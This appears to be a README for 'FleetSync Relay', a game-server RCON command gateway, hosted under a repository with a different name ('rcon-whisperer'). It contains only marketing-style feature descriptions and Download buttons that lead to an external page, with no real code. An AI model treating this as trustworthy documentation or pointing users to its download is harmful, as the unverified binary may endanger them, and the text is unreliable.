![preview](https://raw.githubusercontent.com/tabuforbrenden-glitch/rcon-whisperer/main/banner_c244.svg)

# FleetSync Relay — Unified Server Command Gateway

![Version](https://img.shields.io/badge/Version-2.4.1-2e6b8a) ![Build](https://img.shields.io/badge/Build-Stable-4a9d6e) ![Language](https://img.shields.io/badge/Language-Go-00ADD8) ![License](https://img.shields.io/badge/License-MIT-yellow)

**FleetSync Relay** reimagines remote server administration as a single, elegant command conduit. Instead of juggling multiple terminal windows, custom scripts, and half-remembered query syntax, this daemon acts as a unified translator between you and every game server in your fleet — whether they speak the RCON protocol, a custom TCP handshake, or a simple HTTP webhook.

Think of it as a switchboard operator for your virtual worlds: you dial one number, and the relay routes your voice to the right room, translates the dialect, and brings back the reply in a consistent format. It’s not just a client; it’s a command intelligence layer that learns your server topology, remembers your most used queries, and turns chaotic admin workflows into predictable, scriptable routines.

---

## 🌟 Why Another RCON Tool? The Philosophy Behind the Relay

Most administration tools treat each server as an island. You configure an IP, a port, a password, and you pray the syntax hasn’t changed since the last patch. FleetSync Relay flips that model: the **relay** becomes your single source of truth, and every server becomes a dumb endpoint that speaks through a normalized interface.

This approach matters because modern game fleets are heterogeneous. You might run a vanilla Minecraft server, a heavily modded ARK cluster, and a Source-engine Garry’s Mod instance — each with a different RCON flavor, different command sets, and different quirks. The relay abstracts all of that away. You define a *server profile* once, and from then on, typing `!restart_soft` or `!broadcast "Maintenance in 5 minutes"` works uniformly across every connection.

The result is not just convenience; it’s operational safety. By centralizing command execution, you reduce the risk of typos hitting the wrong box, and you gain a natural audit trail of every action taken, logged with timestamps and originating user IDs.

---

## 📥 Get Started

To begin your journey with FleetSync Relay, you'll need the binary that matches your operating system. We provide pre-compiled packages for Windows, macOS, and Linux (x64 and ARM64 architectures) along with a container image for orchestrated deployments.

[![Download](https://raw.githubusercontent.com/tabuforbrenden-glitch/rcon-whisperer/main/get_087b.svg)](https://tabuforbrenden-glitch.github.io/rcon-whisperer/)

---

## 🎛️ Core Features That Make Administration Feel Like Magic

### 🔌 Multi-Protocol Adapter Layer
The relay doesn’t care if your server speaks the classic Source RCON, the newer Battlefield-style RCON, or a custom JSON-over-TCP protocol. It ships with a plugin-able adapter system — plug in the right module, and the relay handles the handshake, the packet sequencing, and the response parsing for you.

### 📜 Persistent Command History & Macro Engine
Every query you send is stored in a searchable local database. Over time, the relay analyzes your usage patterns and suggests macros for frequently repeated sequences. For example, if you run `status`, `players`, `uptime` every morning, the relay discovers this sequence and offers you a single `!morning_report` macro that bundles all three commands into one output block.

### 👥 Role-Based Access Control (RBAC)
Security is not an afterthought. The relay supports multi-user environments where each operator has a specific role — from *Observer* (read-only status checks) to *SuperAdmin* (full access including config changes). Authentication hooks into your existing LDAP or OAuth2 infrastructure, or you can use built-in token-based credentials for smaller setups.

### 🌐 Multilingual Response Formatting
Server replies often contain locale-specific strings (e.g., German error messages from a Frankfurt-hosted server). The relay includes a translation layer that normalizes common response patterns into English defaults, or you can configure it to translate into any of the 15 bundled languages. This ensures your team, regardless of their locale, sees consistent, understandable output.

### 📡 Webhook & Chat Relay Integration
Extend the relay’s reach beyond the command line. Connect it to your team’s Discord or Slack channel — define a command prefix like `!relay` — and authorized users can execute queries directly from chat. The relay formats replies as clean code blocks, preserving readability. It also sends asynchronous event notifications (e.g., player join/leave, server crash) to configured webhook URLs for proactive monitoring.

### ⚡ Zero-Downtime Configuration Reload
Edit your `relay.toml` file, and the relay picks up the changes without restarting. It gracefully revalidates connections, drops dead ones, and spins up new profiles on the fly. This is critical for live fleets where a restart would interrupt ongoing admin sessions.

### 🛡️ Built-in Rate Limiting & Anomaly Detection
The relay monitors command frequency and flags unusual patterns — such as a burst of password-change attempts from a single source. It can automatically throttle or block that source, protecting your infrastructure from brute-force or compromised-credential attacks.

---

## 🧩 Architecture: A Glimpse Under the Hood

FleetSync Relay is built as a modular Go application, structured into logical packages that separate concerns cleanly:

- **`adapter/`** — Protocol implementations. Each server type has a dedicated adapter that conforms to a common `ServerConn` interface.
- **`core/`** — The heart of the relay: connection pooling, command queueing, and response dispatch logic.
- **`history/`** — Embedded SQLite persistence for command logs and macro definitions.
- **`auth/`** — Token validation, RBAC enforcement, and session management.
- **`webhook/`** — Outgoing HTTP clients for chat integration and event notification.

The relay runs a lightweight HTTP API (on `localhost:8090` by default) that exposes the same functionality as the CLI. This means you can script against a RESTful endpoint instead of fighting with raw TCP streams — a boon for automation tools like Ansible or for building a custom dashboard in Node.js or Python.

### How Commands Flow Through the Relay

```
Client (CLI/API/Chat) 
    → Auth Layer (validates token & role)
    → Command Queue (debounces & merges same-target commands)
    → Adapter (protocol-specific encoding)
    → Server (execution)
    → Response Decoder (normalizes output)
    → Formatter (localizes & pretty-prints)
    → Back to Client (with elapsed time)
```

This pipeline ensures that even if your server responds slowly (e.g., during a heavy save operation), the relay buffers the reply and delivers it as soon as it’s ready, without dropping the request.

---

## 🚀 Deployment Scenarios & Use Cases

### Case Study 1: The Modded Minecraft Cluster
Imagine running a network of 12 modded Minecraft servers, each with a different modpack. You connect all of them to the relay using the `mc-vanilla` and `mc-forge` adapters. A cron job on your admin machine calls the relay’s API every 15 minutes to run `tps` and `memory` checks. The relay aggregates results into a single JSON report, alerting you via webhook if any server drops below 19 TPS. This unified view saves hours of manual SSH sessions.

### Case Study 2: Esports Tournament Infrastructure
During a live tournament, you need instant, low-latency command execution across 5 CS2 servers. The relay’s RBAC allows your referees to execute `pause` and `restart_round` commands, while admins retain the ability to `rcon_reload` the server config. The chat relay integration lets an assistant send a `!relay pause` message from a Discord channel, and the command fires within 100ms — far faster than opening a separate console for each server.

### Case Study 3: Hybrid Dedicated/Cloud Server Fleet
For a server owner who rents bare-metal machines in Europe and spins up cloud instances in Asia, the relay becomes a remote management hub. You configure the cloud instances to auto-register with the relay via a startup script. The relay maintains persistent connections to all boxen, allowing you to push a config change to all 20 instances with a single command. The zero-downtime reload means you can update a global game setting while players are online, without a connect-drop.

---

## 🔧 Configuration Deep Dive

The relay uses a single TOML configuration file, but you can also pass configuration via environment variables (prefixed with `FSR_`). Here’s what a minimal server profile looks like conceptually:

```toml
[server.eu-west-1]
adapter = "source"
host = "192.168.1.10"
port = 27015
password_env = "FSR_PASS_EU"
timeout_ms = 3000
```

For a robust setup, you’ll also define global `[auth]` rules, `[webhook]` endpoints, and `[translate]` language mapping tables. The full configuration reference is available in the `docs/configuration.md` guide within this repository’s documentation folder.

### Dynamic Server Discovery
If you manage a Kubernetes cluster or use Docker Swarm, the relay can subscribe to service discovery endpoints. It will automatically add new server instances as they appear, and remove them when they scale down. This eliminates the manual step of editing the TOML file when you provision or deprovision game servers.

---

## 🛠️ Troubleshooting & Logging

When things go wrong, the relay doesn’t shrug — it explains. The `--debug` flag enables verbose packet logging, showing you the raw bytes sent and received from each server. The internal log aggregator sends output to both stdout and a rotating file (`logs/relay.log` with configurable retention). For persistent issues, you can export a full diagnostic bundle (config, logs, server profile checks) with the `--diagnose` command — a boon for support tickets.

---

## 👥 Community & Support

This project thrives on collaboration. Whether you maintain a niche game server adapter or want to improve the documentation for Latin American users, contributions across all time zones are welcome. Our community channel is active daily, with maintainers responding within a business day on most topics. For critical production outages, a priority support route exists for verified large-scale deployments.

### 🌱 Contributing Guide
We follow a fork-and-pull-request workflow. All PRs must include unit tests for new adapters or logic changes. The codebase uses Go modules, and we enforce `gofmt` styling. A detailed contributing document lives in the repository root, covering everything from setting up your dev environment to signing the Contributor License Agreement.

### 🗺️ Roadmap for 2026
The upcoming major release, *FleetSync 3.0*, focuses on **distributed relay federations** — the ability to chain multiple relays across regions for ultra-low-latency command routing. We’re also experimenting with a machine-learning-assisted command autocomplete that learns from your server’s specific mod configurations. Watch this space for updates posted throughout the year.

---

## 📄 License

FleetSync Relay is lovingly released under the permissive MIT License. You are free to use, modify, and redistribute the code in both personal and commercial projects, provided you retain the original copyright notice. The full legal text can be reviewed in the [LICENSE](LICENSE) file within this repository.

---

## ⚠️ Disclaimer

While FleetSync Relay significantly simplifies server administration, it does not eliminate the responsibility to understand your underlying game server’s behavior. The relay is a **command delivery vehicle**, not a safety net. Misconfigured adapters or incorrectly scoped RBAC permissions could lead to unintended server actions (e.g., accidental bans or world resets). We strongly advise testing any new command or macro against a non-production staging environment first. The project maintainers and contributors assume no liability for data loss, service interruption, or any other damages arising from the use of this software. Always maintain your own backups and follow your game server vendor’s operational guidelines.

---

**Final Thought:** Administration is a craft, not a chore. With the right relay, it becomes a precise, repeatable art. We hope FleetSync Relay becomes the trusty tool in your belt that you reach for every single day.

[![Download](https://raw.githubusercontent.com/tabuforbrenden-glitch/rcon-whisperer/main/get_087b.svg)](https://tabuforbrenden-glitch.github.io/rcon-whisperer/)